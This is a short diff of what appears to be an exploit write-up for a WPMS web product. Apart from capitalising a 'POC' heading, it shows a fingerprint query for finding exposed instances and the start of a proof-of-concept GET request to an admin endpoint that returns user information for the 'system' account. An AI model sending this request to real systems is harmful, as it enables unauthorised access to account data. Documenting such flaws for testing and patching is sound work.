@@ -10,7 +10,7 @@
 body="src=/WPMS/asset/common/js/jsencrypt.min.js"
 ```
 
-## poc
+## POC
 
 ```
 GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
